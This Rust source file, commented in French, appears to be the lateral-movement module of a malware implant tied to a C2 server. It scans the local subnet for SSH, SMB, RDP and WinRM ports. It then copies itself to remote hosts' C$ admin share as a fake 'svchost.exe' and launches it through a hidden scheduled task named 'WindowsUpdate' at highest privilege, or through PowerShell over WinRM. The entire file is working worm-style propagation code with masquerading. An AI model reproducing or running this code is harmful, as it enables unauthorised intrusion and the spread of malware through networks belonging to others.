// Déplacement latéral : scan réseau + propagation via SMB/WinRM.
use std::net::{SocketAddr, TcpStream};
use std::time::Duration;

const SCAN_TIMEOUT_MS: u64 = 300;
const PORTS: &[u16] = &[22, 445, 3389, 5985, 5986]; // SSH, SMB, RDP, WinRM

pub fn run(args: &str) -> String {
    let parts: Vec<&str> = args.trim().splitn(2, ' ').collect();
    match parts.first().copied().unwrap_or("") {
        "scan" | "" => {
            let subnet = parts.get(1).copied().unwrap_or("").trim();
            if subnet.is_empty() {
                scan_local_subnet()
            } else {
                scan_subnet(subnet)
            }
        }
        "spread" => {
            let target = parts.get(1).copied().unwrap_or("").trim();
            if target.is_empty() {
                "usage: propagate spread <ip>".to_string()
            } else {
                spread_to(target)
            }
        }
        _ => "usage: propagate [scan [subnet] | spread <ip>]".to_string(),
    }
}

fn scan_local_subnet() -> String {
    let c2_host = crate::config::C2_URL
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .split(':')
        .next()
        .unwrap_or("8.8.8.8");
    let local_ip = crate::hostinfo::primary_ip(c2_host);

    let parts: Vec<&str> = local_ip.split('.').collect();
    if parts.len() != 4 {
        return format!("IP locale invalide : {}", local_ip);
    }
    let subnet = format!("{}.{}.{}", parts[0], parts[1], parts[2]);
    scan_subnet(&subnet)
}

fn scan_subnet(subnet: &str) -> String {
    use std::sync::{Arc, Mutex};
    use std::thread;

    let results = Arc::new(Mutex::new(Vec::new()));
    let mut handles = Vec::new();

    for host in 1u8..=254 {
        let ip_str = format!("{}.{}", subnet, host);
        let results = results.clone();
        let handle = thread::spawn(move || {
            let found_ports: Vec<u16> = PORTS
                .iter()
                .filter(|&&port| {
                    let addr = format!("{}:{}", ip_str, port);
                    TcpStream::connect_timeout(
                        &addr.parse::<SocketAddr>().unwrap(),
                        Duration::from_millis(SCAN_TIMEOUT_MS),
                    )
                    .is_ok()
                })
                .copied()
                .collect();

            if !found_ports.is_empty() {
                let ports: Vec<String> = found_ports.iter().map(|p| p.to_string()).collect();
                results.lock().unwrap().push(format!(
                    "{:<16}  {}",
                    ip_str,
                    ports.join(", ")
                ));
            }
        });
        handles.push(handle);
    }

    for h in handles {
        h.join().ok();
    }

    let res = results.lock().unwrap();
    if res.is_empty() {
        format!("aucun hôte trouvé sur {}.0/24", subnet)
    } else {
        format!(
            "{} hôte(s) sur {}.0/24 :\n{}",
            res.len(),
            subnet,
            res.join("\n")
        )
    }
}

#[cfg(windows)]
fn spread_to(target: &str) -> String {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    let exe = std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "implant.exe".to_string());

    let remote_path = format!(r"\\{}\C$\Windows\Temp\svchost.exe", target);
    let mut report = Vec::new();

    // 1. Copier le binaire via partage admin SMB (C$)
    let copy_res = std::fs::copy(&exe, &remote_path);
    match &copy_res {
        Ok(_) => report.push(format!("[ok] copie → {}", remote_path)),
        Err(e) => {
            report.push(format!("[ko] copie SMB: {}", e));
            // Fallback WinRM
            let ps = format!(
                "Invoke-Command -ComputerName {} -ScriptBlock {{ Start-Process 'C:\\Windows\\Temp\\svchost.exe' }}",
                target
            );
            let wr = Command::new("powershell")
                .args(["-NoProfile", "-Command", &ps])
                .creation_flags(0x08000000)
                .output();
            match wr {
                Ok(o) if o.status.success() => report.push("[ok] exécution via WinRM".to_string()),
                Ok(o) => report.push(format!("[ko] WinRM: {}", String::from_utf8_lossy(&o.stderr).trim())),
                Err(e) => report.push(format!("[ko] WinRM: {}", e)),
            }
            return report.join("\n");
        }
    }

    // 2. Exécuter à distance via schtasks ou WinRM
    let schtask_res = Command::new("schtasks")
        .args([
            "/create", "/f",
            "/s", target,
            "/tn", "WindowsUpdate",
            "/tr", r"C:\Windows\Temp\svchost.exe",
            "/sc", "once",
            "/st", "00:00",
            "/rl", "highest",
        ])
        .creation_flags(0x08000000)
        .output();

    match schtask_res {
        Ok(o) if o.status.success() => {
            let _ = Command::new("schtasks")
                .args(["/run", "/s", target, "/tn", "WindowsUpdate"])
                .creation_flags(0x08000000)
                .output();
            report.push(format!("[ok] exécution via schtasks sur {}", target));
        }
        _ => {
            let ps = format!(
                "Invoke-Command -ComputerName {} -ScriptBlock {{ Start-Process 'C:\\Windows\\Temp\\svchost.exe' }}",
                target
            );
            let wr = Command::new("powershell")
                .args(["-NoProfile", "-Command", &ps])
                .creation_flags(0x08000000)
                .output();
            match wr {
                Ok(o) if o.status.success() => report.push("[ok] exécution via WinRM".to_string()),
                Ok(o) => report.push(format!("[ko] WinRM: {}", String::from_utf8_lossy(&o.stderr).trim())),
                Err(e) => report.push(format!("[ko] WinRM: {}", e)),
            }
        }
    }

    report.join("\n")
}

#[cfg(not(windows))]
fn spread_to(_target: &str) -> String {
    "propagation disponible sur Windows uniquement".to_string()
}
